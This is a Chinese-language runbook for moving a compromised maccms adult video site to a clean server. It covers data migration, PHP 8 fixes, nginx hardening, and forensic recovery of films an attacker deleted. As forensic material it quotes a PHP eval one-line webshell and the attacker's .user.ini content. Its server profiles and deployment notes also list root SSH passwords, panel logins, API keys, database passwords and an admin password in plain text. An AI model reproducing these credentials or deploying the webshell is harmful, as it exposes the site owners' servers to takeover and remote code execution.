# 杏吧资源站 迁移运行手册（2026-09）

源机 **中毒（活跃 webshell）** → 新机全新部署。遵循 skill `maccms-migrate` 的原则：
**只搬数据（DB + upload 图片），代码一律用本仓库全新部署，admin 表重建 —— 天然甩掉后门。**

---

## 范围与原则

| 项 | 决策 |
|---|---|
| 搬什么 | ① `sexba` 库数据 ② `upload/` 下**图片**（白名单：jpg/jpeg/png/gif/webp/bmp/ico） |
| **不**搬什么 | 全部 PHP 代码、`application/data/`(2.2G 缓存)、`log/`、webroot 里 35G 历史备份包、模板 |
| 代码 | 本仓库 `feat/tp8-migration`，`bin/maccms new` 全新部署 |
| 数据库 | 源 MyISAM/utf8mb3 → 新 **InnoDB/utf8mb4**（新架构建表 + 只导数据） |
| 管理员 | **不导 `mac_admin`**，新装时重建 |

---

## 两机档案

### 源机（脏 · 宝塔）23.225.146.130
- SSH `root` / `Cc0Qm4jHEEnMQXWs77ZJag7J9We30URD`（同时是宝塔 API key）
- 面板 **11.8.1**，真实端口 **16899**（不是 33417，那个口防火墙放行了但无人监听），入口 `/fec66a79`
- API 已开，`limit_addr` 含 `23.225.11.154`；签名 = `md5(request_time + md5(api_key))`
- CentOS 7.9 / 8 核 / 15.6G / PHP 7.2+7.4 / **MySQL 5.7.44** / Redis / 无 Meilisearch
- 站点：
  | 目录 | 用途 | 库 |
  |---|---|---|
  | `ceshi.yuxiuzy.com` | **杏吧资源站主站**（maccms10，TP5 布局） | `sexba` / `2kzCk6fneZ2nbwyR` |
  | `www.xbww888.com` | 静态播放器解析页（900K） | — |
  | `pic.doyinapi.com` | 图床（32K） | — |
  | `xbaxzyouyou` | Python m3u8 下载器（`xbxz.py`，每天 1:30 cron） | — |
  - 另有两个**无站点引用**的库：`445445_top`、`ceshi1233`（迁移前需确认是否还要）
- 主站数据：`mac_vod` **93,527** / `mac_art` **77,401** / 库 1.86G / 28 表**全 MyISAM** / `utf8_general_ci`
- 主站配置：主题 `m1938pc3`，`html_dir=html9`，`site_url=sex8zy.com`
- 主站域名（nginx `server_name`，31 个）：
  `sex8zy.com` … `sex8zy9.com`（含 www）、`xingbazy.com`、`xingba111.com`、`xingba222.com`、
  `json.xgbkk8.com`、`json.xingba222.com`、`json.xgbbk8.com`、`api.xgbbk8.com`
- 采集：`application/extra/timming.php` 每小时从 `http://23.225.146.131/api.php/provide/vod/` 采集

### 目标机（净 · aaPanel）85.149.233.2
- SSH `root` / `MzYwNjNlOGQwNzIzOGVjN2U2YmU5MzFlMTRiZDczN2U=`（**就是这串 base64 原文**，不是解码值）
- 面板 **aaPanel 8.0.6** `https://85.149.233.2:18053/9280f473`，账号 `ws97ulab` / `1b17aab4`
- API key `vPXoXDNL2SiuOTc1oORlZqI8kpuOT8Bp`，`limit_addr` 含 `23.225.11.154`
- Debian 12 / **56 核 / 125G 内存** / 高防 IP 段 85.149.233.2-6（5G）
- **磁盘：`/` 仅 92G，`/home` 是 3.4T LVM** → 站点与（建议）MySQL 数据目录都放 `/home`
- MySQL **8.4.11** root `490476c4c6bba097`

---

## 已完成

### 基础设施（目标机 85.149.233.2）
| 组件 | 版本 | 状态 |
|---|---|---|
| nginx-openresty | — | systemd active + enabled |
| PHP | **8.3.33** | active + enabled；补装 **opcache / fileinfo / redis** |
| MySQL | **8.4.11** | active + enabled，root `490476c4c6bba097` |
| **Dragonfly** | v1.40.1 | 127.0.0.1:6379，口令 `/etc/dragonfly/password`，56 核自适应 **8 线程 / 8192 MiB** |
| **Meilisearch** | v1.47.0 | 127.0.0.1:7700，key 见 `/etc/meilisearch/meilisearch.env` |

### 站点
- **主站** `/home/wwwroot/xingba`（放 `/home` 3.4T，不放 `/` 92G），库 `xingba`，前缀 `mac_`
  - 应用账号 `xingba_app` / `TAJSAQQQUIJ85EIZH5RFL9J0`（写在 `.env`）
  - 管理员 `xbadmin` / `80PH4NM60VWE`
  - **后台入口已改名 `xb604b732acf03.php`**（`admin.php` → 404），`install.php` 已移走
  - 主题 `m1938pc3` / `html9`（站主上传），`site_url` 冒烟期 = `85.149.233.2`
- **播放器解析站** `/home/wwwroot/xbww888`，6 域名，纯静态（`index.php` 零 PHP 代码）

### 数据（条数与源机逐表一致）
| 表 | 条数 |
|---|---|
| mac_vod | 93,527 |
| mac_art | 77,401 |
| mac_annex | 9,826 |
| mac_type | 57 |
| mac_collect / mac_group / mac_link / mac_user | 4 / 3 / 1 / 1 |
| mac_admin | 1（**新建，未导旧的**） |

- 迁移方式：老 dump 先进临时库 `xingba_src` → 比对新旧字段 → 逐表 `INSERT...SELECT` 公共字段灌入新结构。
  **老有新无的字段只出现在 `mac_banner`/`mac_banner_cat`/`mac_tmpart`，而这三张表老库都是 0 行 → 零数据丢失。**
- 新库 **55 张表全部 InnoDB + utf8mb4**（安装 SQL 有 28 张硬编码 `CHARSET=utf8`，趁空表时 `CONVERT TO` 转掉）。
- 图片 `upload/` 3,870 张 / 158.8MB 已就位。

### Meilisearch
- 索引 `maccms_xingba`（**按库名派生，绝不用共享默认 `maccms_contents`**）
- **170,911 文档 = vod 93,510 + art 77,401，与库中已发布条数逐类对齐**
- 巡检 `/root/xingba_meili_healthcheck.php` + `*/10` cron，日志 `/var/log/xingba-meili-health.log`
  （验 ① index_uid 合法 ② key 有效/索引存在 ③ 条数漂移 <5%）

### 三个任务
1. **主题迁移 + PHP8 语法升级**（`m1938pc3`）
   - `{$x|date='...',###}` **26 处 / 20 文件** → 去掉 `,###`。
     根因：think-template v3 的 `case 'date'` 排在 `default` 分支**之前**，压根不处理 `###`，
     于是编译出 `date('Y-m-d',###,<值>)` → PHP 解析错误。TP5 能跑、TP8 不行。
     ⚠️ `str_replace=...,###`（分页用）**不能动**，那类走 default 分支本来就正常。
   - `{notempty name="obj[vod_down_from]"}` → `name="obj.vod_down_from"`。
     根因：方括号写法编译成未加引号的 `$obj[vod_down_from]`，**PHP 8 把未定义常量从「警告+退化成字符串」改成致命错误**。
   - 验收：56 分类页 + 20 详情 + 10 播放 + 10 文章 + 首页/搜索/RSS/留言 **全部 2xx**。
2. **帮助页升级**：装 `template/m1938pc3/html9/help/index.html`（自 demo 版移植，沿用本主题
   `public/include|head|foot`），填 `mac_help_cfg`；主题 `public/head.html` 里 2 处硬编码
   `https://sex8zy.com/template/help/` → `{:mac_help_url()}`。
   采集接口沿用老站 URL（下游合作方已配置）。
3. **macrep 模板**：装 `template/m1938pc3/html9/rep/index.html`（自 demo 版移植，
   强调色 `#0b87e7` → 本主题青色 `#008fc7`，符合「共享模块必须沿用各站主题」）。

### 安全加固
- nginx 两站均加 `location ~* ^/(upload|uploads|images|static/upload)/.*\.(php|php5|phtml|phar|shtml)$ { deny all; return 403; }`
  —— **实测返回 403**。源机正是从 `upload/` 能跑 PHP 被植入 `as.php` 的。
- 后台入口改名 + 删 `install.php`。
- PHP `disable_functions` 保持 aaPanel 加固默认（含 `chown`/`putenv`/`symlink`）；
  部署 CLI 另给一份放宽的 `/etc/maccms/php-cli.ini`，**FPM 侧不放开**。
- 源机 `/root/.ssh/authorized_keys` 的 `hades@Laptop.local` 已清除（备份 `/root/ioc/`）。

### 路上踩到并修掉的坑
1. **仓库 bug：`migration/infra/dragonfly.sh` 全新机装不上**（已改仓库）
   `cmd_install()` 把 `fetch_binary` 排在建目录之前，而 `install(1)` 不建父目录 →
   `/opt/dragonfly/bin` 不存在直接失败。已把 `ensure_user`/`ensure_dirs` 提到 `fetch_binary` 前。
   `meilisearch.sh` 顺序本来就是对的。
2. 🔴 **仓库 bug：`vendor/` 快照缺 composer 自动加载注册**（**影响任何新部署**，仓库侧待修）
   `composer.lock` 里有 `topthink/think-view` + `think-template`（psr-4 `think\view\driver\` → `src`），
   但 `vendor/composer/installed.json` 和 `autoload_psr4.php` **都没有它们** —— 包目录是手工塞进
   `vendor/topthink/` 的，自动加载器从没注册过。表现：整站 500 `Driver [Think] not supported.`
   本次靠新机上 `composer install --no-dev --optimize-autoloader`（按 lock，2 installs / 0 updates）解决。
3. **aaPanel 装 nginx/PHP 全失败 = 缺编译依赖**（Debian 12 净机）
   nginx 缺 `libgd-dev`、PHP 缺 `libwebp-dev`，且 `dpkg was interrupted` 必须先 `dpkg --configure -a`。
   重跑：`cd /www/server/panel/install && bash install_soft.sh 0 install nginx openresty` / `... php 83`。
   PHP 编译完 `version.pl` 缺失会导致面板不认，需补写。
4. **`pkill -f "nginx: "` 会误杀 aaPanel 自身的 webserver**（面板也是 nginx 系进程）→ `/etc/init.d/bt restart` 恢复。
5. **安装脚本在 systemd 之外拉起 nginx/php-fpm** → `systemctl start` 报 already running，需先清野进程。
6. **`GROUP_CONCAT` 默认 1024 字节上限**把 `mac_vod` 80+ 字段名截断，生成残缺 SQL 报语法错误。
   → `SET SESSION group_concat_max_len = 1048576`。
7. **Meili 全量重建 CLI 默认 128M 内存不够**（OOM）→ `-d memory_limit=4G`；
   且 `bootstrapIndex()` 等 settings 任务只等 30s，首次建索引会超时误报 `ok:false`（Meili 后台其实会跑完），
   settings 落定后重跑即成功。
8. **备份文件不能放 `application/extra/`** —— `Begin.php` 会扫描并告警非白名单文件
   （`[ALERT] Suspicious file in extra/`）。备份放 `/root/xingba-cfg-bak/`。

---

## 防「带毒过来」的硬规矩

源机 `upload/` 里已确认的攻击者残留（均 2026-09-07）：

| 文件 | 说明 |
|---|---|
| `upload/as.php` | 一句话木马 `<?php @eval($_POST["cmd"]);?>`，md5 `a27b71d102a0d3957373700f785bead7` |
| `upload/.user.ini` | 内容 `open_basedir=/` —— 攻击者解除目录限制好让马读全盘 |
| `upload/zzu9527x2ex70x68x70` | 文件名后缀是 `.php` 的十六进制转义，写马探测 |
| `upload/zzw9527.txt` | 探测标记 |
| `d6548be607b9cc0fd8a6727eb4808b79.php`（webroot 根） | 17 字节二进制，2026-09-08 落地 |

**因此传输一律用「扩展名白名单」，不是黑名单**：

```bash
# 源机打包(只收图片，天然甩掉上面所有残留)
ssh root@23.225.146.130 "cd /www/wwwroot/ceshi.yuxiuzy.com && \
  find upload -type f -iregex '.*\.\(jpg\|jpeg\|png\|gif\|webp\|bmp\|ico\)$' -print0 \
  | tar --null -T - -czf - " > upload-images.tar.gz
```

已验证的结论（不必重做）：
- `upload/` 共 3896 文件，其中图片 **3870 个 / 158.8 MB**
- **0 个图片含 `<?php`** → 无图片马。（`<?=` 有 21 个命中，但那是 3 字节序列在 155MB
  二进制里的巧合，抽样确认是真 JPEG。判图片马**只能用 `<?php`，别用 `<?=`**。）
- `mac_vod.vod_pic` **93,527 条全是完整 `http://` URL，无一相对路径**
  → 不吃 `upload.remoteurl`，不会重演乐播「图全挂」。（源机那份配置里
  `upload.remoteurl=http://img.test.com/` 是冒烟机样板残值，正好印证陷阱 #2，但本站不受影响。）
- `vod_jumpurl` 注入 **0 条**；`application/extra/addons.php` 干净（未被 addons 后门劫持）
- 源机持久化检查：无 rogue 系统用户、无 uid-0 旁路、无 www crontab、无异常 cron.d/systemd
- 源机 `/root/.ssh/authorized_keys` 有两把钥匙：`root@CTG145`（本机自签）和
  **`hades@Laptop.local`（外来，需向站主确认是否本人）**

DB 侧：只导数据、不导 `mac_admin`；新库全新建表，源库的老结构（如 `mac_collect` 缺
`collect_status` 列）不会被带过来。

---

---

## 采集入库回归（TP8 + MySQL 8.4 实测）

**结论：全链路打通。** 真实采集 10 页 / 200 条 → `新加入库，成功ok。`，
vod 93,527 → 93,532（测试记录已删回 93,527，bind.php 已还原 110 条）。

### 手册原有的两条：仓库早已修好，本次只是验证
| 真因 | 仓库修复位置 | 验证结果 |
|---|---|---|
| MySQL 8 严格模式 | `config/database.php` 的 `PDO::MYSQL_ATTR_INIT_COMMAND` | 应用连接 `sql_mode=NO_ENGINE_SUBSTITUTION`；实测空串→decimal 存 `0.0`、`99999`→smallint 截断 `32767`，不报错 ✅ |
| TP5 字符串 `limit` | 已改为 `limit(int,int)` | 全仓库扫描 0 处残留 ✅ |

### 🔴 本次新发现并修复的 4 个仓库级 PHP 8 缺陷
全是同一类：**PHP 7 对「读未定义数组键」只警告，PHP 8 抛 Error**，而本项目的错误处理器把它转成 `ErrorException` → 整个请求 500。
迁移场景必然触发，因为老站存下来的参数串/配置早于这些新增字段。

1. **`Collect.php` 的 `$param['page']` 等 56 处裸读**
   `Collect::api()` 只在传了 `pg` 时才设 `page`，而**老 timming 参数串里既无 `pg` 也无 `page`**。
   另有 `unset($param['page'],$param['ids'])` 后 `http_build_query` 生成的 URL 缺这两个键，
   **下一个请求**进来照样炸。修：9 处 `is_numeric($param['page'] ?? '')` + 47 处 builder 赋值加 `?? ''`。
2. **`mac_curl_get()` 的 `CURLOPT_SSL_VERIFYHOST, 1`**（`common.php`）
   该值 PHP 8 已不接受（只认 0/2）→ **任何 https 采集源直接崩**（http 源不触发，所以长期没暴露）。
   改为 `2`，与同文件 `mac_curl_post()` 一致（两者同为 `VERIFYPEER=0`）。
3. **`$bind_list[$bind_key] > 0` 7 处裸读**
   上游只要出现一个**尚未绑定的分类**，整次采集就崩。改 `($bind_list[$bind_key] ?? 0) > 0`
   —— 恢复 PHP 7 的语义（未绑定→走 else→标记「分类未绑定，跳过」）。
4. **`$param['sync_pic_opt']` 7 处裸读**
   这是后加的功能字段，**老 TP5 时代存下来的 timming 参数串里根本没有它** → 迁移站定时采集必崩。

### 扩散检查（按站主要求，不做逐个撞）
写了三个扫描器，覆盖 365 个 PHP 文件：

| 扫描 | 结果 |
|---|---|
| PHP 8 已删除/变更 API（`each`/`create_function`/`money_format`/`$s{0}`/`implode` 参数序/`mb_strrpos`/`restore_include_path`/curl 非法值/字符串 `limit`）10 类 | **8 类清零**；`get_magic_quotes_*` 2 处均有 `function_exists` 守卫，安全 |
| 采集配置缺键（代码读取 vs 中性样板提供） | 修前 **7 缺**（`collect.vod` 的 `playerwords`/`areawords`/`langwords`/`pseplayer`/`psearea`/`pselang`，`collect.comment.pic`）→ **修后 0** |
| 全配置树「直接数组访问且样板缺键」（PHP 8 下必致命） | 修前 **17 处致命** → **修后 0** |

配置缺键有两层修复，缺一不可：
- **样板补 20 键**（`application/data/config/maccms.example.php`）→ 修**新装站点**；
  含 `view.{actor,manga,website}_detail`、`rewrite.manga_id`、`user.{manga_points_type,reg_group}`、
  `website.refer_visit_num`、`sms.content`、`pay.{epay,jeepay}`、`site.site_publish_*`、`app.*` 等。
  已过泄漏自检（无任何站点真实值）。
- **代码补默认值**（`Collect::collectDefaults()`，7 个模块选择处 `+=`）→ 修**存量老站**，
  因为老站的 `extra/maccms.php` 已存在、不会再从样板播种。

杏吧线上配置也已按同法补入 27 个缺键，站名/域名/主题/缓存/Meili 等既有值一律未动。

### 本次仓库改动
```
application/common.php                     |   6 +-   ← curl VERIFYHOST
application/common/model/Collect.php       | 174 +++---  ← 4 类裸读 + collectDefaults()
application/data/config/maccms.example.php |  43 +++    ← 补 20 个缺键
migration/infra/dragonfly.sh               |   4 +      ← 建目录顺序
```
`vendor/` 的 composer 自动加载缺失**无法进 git**（`/vendor` 在 .gitignore），
已修好本机副本；根治办法是让 `bin/maccms` 部署时跑 `composer install` 或校验自动加载器，**仍待办**。

---

---

## 🔴 只靠 HTTP 状态码冒烟会漏掉的两类缺陷（本次实际漏了，站主发现）

第一轮冒烟我用的是**自己拼的 URL**（`/index.php/vod/type/id/54.html`）并只看状态码，
19 项全绿 —— 但站主一打开首页就发现**列表全空、站内链接全 404**。两条都被状态码检查漏掉。

### ① 伪静态默认开着，但仓库不发 nginx 规则 → 站内链接全 404
中性样板 `rewrite.status / route_status = '1'` → `mac_url()` 生成
`/arttype/107.html`、`/vodtype/71.html`，而本仓库**不发 nginx 伪静态规则**，全部 404。
首页能开，但**页面上每一个链接都是死的**。
本项目既定约定本来就是不走伪静态（`mac_rep_url`/`mac_help_url` 都写死
`/index.php/<route>.html`），是样板错了。改 `'0'` 后两种 URL 都通，老链接向后兼容。

### ② PHP 8 字符串比较语义 → `type="current"` 列表静默全空
```php
if($type=='current'){ $type = intval($GLOBALS['type_id']); }  // 首页 → int 0
if($type!='all') { ...按分类筛选... }
```
- **PHP 7**：`0 == 'all'` 为**真** → 筛选整段跳过 = 不限分类 → 首页列全部影片
- **PHP 8**：`0 == 'all'` 为**假** → 进入筛选，只命中顶级分类，而内容都挂子分类 → **0 条**

实测同一行 `intval('') != 'all'`：PHP 8.3 → `true`，PHP 7.4 → `false`。
Vod/Art/Actor/Website/Manga 五个模型同一条链，全改。
**这类比未定义键更危险**：不抛异常、不写日志、HTTP 200，只是页面空。

### ③ 会员组分类权限缺失 → 8 万篇文章 + 2872 部视频无人可访问

文章分类点进去是「您没有权限访问此数据，请升级会员」。查 `check_user_popedom()`：
权限要**两个字段同时满足**——`mac_group.group_type`（`,id,id,` 格式的分类白名单）
**和** `group_popedom[type_id][p]`。

三个组的覆盖情况（`mac_group` 与源站**字节一致**，是站点历史遗漏，不是迁移弄坏的）：

| 组 | 原覆盖 | 缺视频 | 缺文章 |
|---|---|---|---|
| 1 游客 | 32 | 9 (89-97) | 16 (98-113) |
| 2 默认会员 | 32 | 9 | 16 |
| 3 VIP(停用) | 24 | 17 | 16 |

**三个组全缺 = 没有任何人能看**，等于 2,872 部视频 + 77,401 篇文章全部锁死 →
判定为遗漏而非付费墙。源站那些页面同样打不开（返回 19 字节乱码，比新站还差）。

修法：给三个组补齐到全部 57 个分类，`group_type` 保持 `,id,` 首尾逗号格式，
`group_popedom` 用与既有条目完全一致的 `{"1":"1","2":"2","3":"3","4":"4","5":"5"}`。
改前备份 `mac_group` 到 `/root/xingba-cfg-bak/`。改完必须清 Dragonfly 缓存（组权限走缓存）。

### 教训：冒烟测试必须爬页面真实生成的链接 + 核对正文非空

改用爬虫从渲染结果里抽 `href` 逐个测，3 层深度、**双判据（状态码 + 正文非空）**，
覆盖首页/分页/分类页/分类分页/文章分类/文章分类分页/影片详情/文章详情/播放页/帮助页/静态资源，
**48 个真实链接全部通过**；56 个启用分类**逐个**验过都有内容。

自己拼 URL 会两头出错：既漏掉真实路径（`/vodtype/N.html` 伪静态形式），
也会误报（我拼的 `/index.php/artdetail/848.html` 是斜杠，而主题实际生成
`/index.php/artdetail-848.html` 是**连字符**，斜杠形式本就该 404）。
首页修复后 56,676 B → 116,838 B（源站 118,632 B）。

---

---

## 🔴 数据被攻击者删除 —— 取证与恢复（2026-09-08 夜）

站主反馈影片量对不上（应 11 万+，迁移过来只有 93,527）。查老机宝塔备份，**证据链完整**：

### 取证：备份体积时间线锁定删除窗口
```
09-06 04:00   691,828,380      ← 单调增长,说明此前无删除
09-07 08:00   691,857,000
09-08 04:00   691,887,020
09-08 08:00   691,887,645      ← 最后一份正常备份
09-08 15:35   544,642,672      ← 骤降 1.47 亿字节
```
实测行数（`awk` 数 extended-insert 的 `),(`，注意 mysqldump 按字母序导表、
`mac_art` 在 `mac_vod` 之前，计数脚本别在 mac_art 处 `exit`）：

| 备份 | mac_vod | mac_art |
|---|---|---|
| 09-08 08:00 | **112,599** | 77,402 |
| 09-08 15:35 | **0**（残废备份） | 41,577 |
| 迁移过来的现状 | 93,527 | 77,401 |

**丢失 19,072 部影片**。而 webshell 活跃窗口是 **09-08 12:20–13:55**，
正好夹在 08:00 与 15:35 之间 —— 时间线吻合，判定为攻击者删库。

### 处置
1. **留证**：`upload/as.php`（md5 `a27b71d1…`）、`upload/.user.ini`(`open_basedir=/`)、
   `zzu9527x2ex70x68x70`、`zzw9527.txt`、`d6548be6…php`，连同 **19,180 行** webshell 访问日志，
   全部留在老机 `/root/ioc/20260908/`。
2. **清除**：删掉上述全部攻击残留；复查 `upload/` 无可执行脚本、全站无一句话木马特征。
3. **老机加固**：nginx 加 upload 目录禁 PHP（实测 403，图片与站点不受影响）。
   ⚠️ 老机 PATH 里的 `nginx` 指向 **lecdn 的 openresty**，而实际跑的是
   `/www/server/nginx/sbin/nginx`（宝塔）——测配置和 reload 必须用**绝对路径**，
   否则改了个不生效的配置还以为成功了。
4. **恢复数据**：取 **09-08 08:00** 那份（删除前最后一份、且数据最新）导入临时库
   `xingba_restore`，再按「公共字段 INSERT…SELECT」重灌进生产库 —— 保留新库的
   InnoDB/utf8mb4 结构与本次部署的全部配置成果，**跳过 `mac_admin`**（保住新管理员）。
   恢复前先把当前库整库备份到 `/home/migration/pre-restore/`。
5. **恢复会覆盖 `mac_group`**，所以之后必须重跑一次分类权限补齐（`/root/fix_group_popedom.php`），
   再清 Dragonfly 缓存、重建 Meilisearch 索引。

### 恢复结果（2026-09-08 23:28 完成）

| 表 | 恢复前 | 恢复后 | 备份基准 |
|---|---|---|---|
| mac_vod | 93,527 | **112,599** ✅ | 112,599 |
| mac_art | 77,401 | 77,401 ✅ | 77,401 |
| mac_annex | 9,826 | 9,894 ✅ | 9,894 |
| mac_type | 57 | 57 ✅ | 57 |
| mac_admin | 1 | 1（新建的 xbadmin，未被覆盖）✅ | — |

**找回 19,072 部影片。** Meilisearch 重建 `ok=true` → 189,988 文档、`isIndexing=false`、
巡检 `[OK]`。三个会员组权限已重新补齐到 57 个分类。

验收：56 个启用分类**逐个**验过都有内容；48 个页面真实生成的链接双判据全部通过；
首页显示「今日更新 196 / 本站共有影片 112,582 / 资讯 77,401」，页面 114,495 B。

**回滚材料**（都在新机）：
- 恢复前整库备份 `/home/migration/pre-restore/xingba-before-restore.sql.gz`（744M）
- 备份源文件 `/home/migration/sexba-0908-0800.sql.gz`（660M）
- 临时库 `xingba_restore`（保留，确认无误后可 `DROP DATABASE`）
- `mac_group` 改动前备份 `/root/xingba-cfg-bak/mac_group.bak.*.sql`

**踩到的坑**：
- `mysqldump` 导出的 `SET @@GLOBAL.GTID_PURGED` 在目标库会报
  `ERROR 3546 ... must be a superset` —— 用 `--force` 跳过即可，不影响数据（临时库 28 表齐全）。
- 数备份行数时注意 mysqldump **按字母序**导表，`mac_art` 在 `mac_vod` **之前**，
  计数脚本若在 `mac_art` 处 `exit` 会得到 0。

---

## 待办

### 切换前
- [ ] `site_url` 从 `85.149.233.2` 改成正式域名（`sex8zy.com`）
- [ ] `mac_help_cfg` 的 `tg_url` / `notice` 仍为空 —— 老主题里那个 `https://t.me/sjzyw`
      看着是模板自带的**别家** TG 群，没敢填，需站主给杏吧自己的
- [ ] `bin/maccms tune --apply`（56 核 / 125G，值得跑）
- [ ] 采集入库回归（TP8/MySQL8 两个真因见 skill 陷阱 #16）
- [ ] 主题 `-副本` 废弃文件里仍有硬编码 `https://sex8zy.com/template/help/`（当前不生效，建议清理）
- [ ] `html9/index/index.html:698` 的播放器包下载链接 `https://xingba111.com/template/help/bfq/mac_sex8zy.zip`
      是外链实体文件，切换后需确认仍可达

### 切换
站主决定：**做一个 CNAME，其它域名 CNAME 过来**。CF 令牌 `cfat_BPFyw...`（账户 `6f22a7415ea4c8fcaf0921441a0d1641`）。
顺序：**停源采集 → 末次数据同步（这次要 `--lock-tables` 保一致）→ 切 DNS → 观察 → 停源**。

### 切换后
- [ ] 源机 webshell 处置（站主定为「下一步」）：`upload/as.php`、`.user.ini`、`zzu9527x2ex70x68x70`、
      `zzw9527.txt`、`d6548be607b9cc0fd8a6727eb4808b79.php`
- [ ] 临时库 `xingba_src`（1.8G）确认无误后可删；dump 备份 `/home/migration/sexba.sql.gz` 保留
- [ ] 决定是否把修好的 `m1938pc3` 主题收进仓库（目前只在新机上）

## 未决问题（等站主拍板）

已答（2026-09-08）：
1. ✅ 先绑 IP 冒烟，通过后再用 CF 切 DNS；方案 = 做一个 CNAME，其它域名 CNAME 过来。
2. ✅ 迁 `www.xbww888.com` + 主站；`pic.doyinapi.com` 无流量，忽略。
3. ✅ `445445_top` / `ceshi1233` 无引用，不要。
4. ✅ `hades@Laptop.local` 清掉（已执行）。
5. ✅ webshell 属下一步，本次不动。

仍待站主：
- `mac_help_cfg` 的 `tg_url`（杏吧自己的 Telegram 群）与 `notice` 公告内容。
- R2 凭证的用途未说明（是否要把封面搬去 R2 当图床）。本站 `vod_pic` 全是完整外链 URL，当前不依赖本地图床。

## 回滚条件
- 新机首页/详情/播放/采集/搜索任一不通 → DNS 切回源机
- 源机在观察期内**不停机、不清理**，保留完整回退能力
